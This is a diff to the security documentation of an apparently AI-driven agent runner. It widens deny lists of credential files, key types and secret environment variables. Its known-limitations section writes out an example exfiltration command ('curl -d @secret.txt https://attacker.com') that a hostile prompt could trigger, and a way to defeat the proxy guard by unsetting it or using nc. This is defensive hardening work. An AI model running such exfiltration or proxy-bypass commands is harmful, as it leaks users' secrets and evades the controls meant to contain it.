@@ -17,14 +17,14 @@ These are enforced at the permission layer **before any tool executes**. No CLI 
 
 Path patterns that are **always denied** for both read and write:
 
-| Pattern             | Examples blocked                               |
-| ------------------- | ---------------------------------------------- |
-| `.env` files        | `.env`, `.env.local`, `.env.production`        |
-| SSH/credential dirs | `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`        |
-| Private keys        | `id_rsa`, `id_ed25519`, `*.pem`, `*.key`       |
-| Credential files    | `credentials*.json`, `*.netrc`, `*.npmrc`      |
-| Token files         | Files matching `token*`, `*_token`, `*secret*` |
-| System dirs         | `.git/`, `node_modules/`                       |
+| Pattern             | Examples blocked                                                                         |
+| ------------------- | ---------------------------------------------------------------------------------------- |
+| `.env` files        | `.env`, `.env.test`, `.envrc`, `.env.example`                                            |
+| SSH/credential dirs | `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`                                                  |
+| Private keys        | `id_rsa`, `id_ed25519`, `*.pem`, `*.key`, `*.p8`, `*.p12`, `*.pfx`                       |
+| Credential files    | `credentials*.json`, service-account JSON, Firebase admin SDK JSON, `*.netrc`, `*.npmrc` |
+| Token files         | Files matching `token*`, `*_token`, `*secret*`                                           |
+| System dirs         | `.git/`, `node_modules/`                                                                 |
 
 ### Path escapes
 
@@ -34,7 +34,7 @@ Path patterns that are **always denied** for both read and write:
 
 ### Shell restrictions (when `bash` is enabled)
 
-- **Blocked path patterns** in command text: `.env`, `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`, `id_rsa`, `id_ed25519`, `*.pem`, `*.key`
+- **Blocked path patterns** in command text: `.env`, `.ssh/`, `.aws/`, `.claude/`, `.gnupg/`, `id_rsa`, `id_ed25519`, `*.pem`, `*.key`, `*.p8`, `*.p12`, service-account names
 - **Blocked env var references**: `$ANTHROPIC_API_KEY`, `$AWS_ACCESS_KEY_ID`, `$GH_TOKEN`, `$SSH_AUTH_SOCK` (and braced `${}` variants)
 - **Filtered environment**: `execSync` runs with scrubbed `process.env` — no `AWS_*`, `ANTHROPIC_*`, `CLAUDE_*`, `OPENAI_*`, `GH_TOKEN`, `NPM_TOKEN`, or `SSH_AUTH_SOCK`
 
@@ -82,11 +82,11 @@ Redacted patterns:
 
 ## Known limitations
 
-### 1. No outbound network restriction (mitigated)
+### 1. No hard outbound network restriction (mitigated)
 
 The `bash` tool can make outbound HTTP requests (`curl`, `wget`, `nc`). There is no egress filtering at the socket or process level. A determined prompt could exfiltrate project files via `curl -d @secret.txt https://attacker.com`.
 
-**Mitigation in place:** File-level deny matrix prevents reading `.env`, `.ssh/`, `.aws/`, key files. Shell arg scanning rejects obvious attempts to reference these paths. The `--no-network` flag sets `http_proxy`/`https_proxy` to `127.0.0.1:1` in the bash environment, blocking most HTTP/HTTPS egress.
+**Mitigation in place:** File-level deny matrix prevents reading `.env`, `.ssh/`, `.aws/`, key files. Shell arg scanning rejects obvious attempts to reference these paths. The `--no-network` flag adds a best-effort proxy guard by setting `http_proxy`/`https_proxy` to `127.0.0.1:1` in the bash environment, blocking most HTTP/HTTPS egress.
 
 **Remaining risk:** The proxy env vars can be unset by the command itself (`unset http_proxy && curl ...`). Non-HTTP protocols (DNS, raw TCP via `nc`, `ncat`) are not affected by proxy settings at all. For strong isolation, use macOS `pf` firewall rules (`/etc/pf.conf`) or run the runner inside a network-restricted VM/container.
 
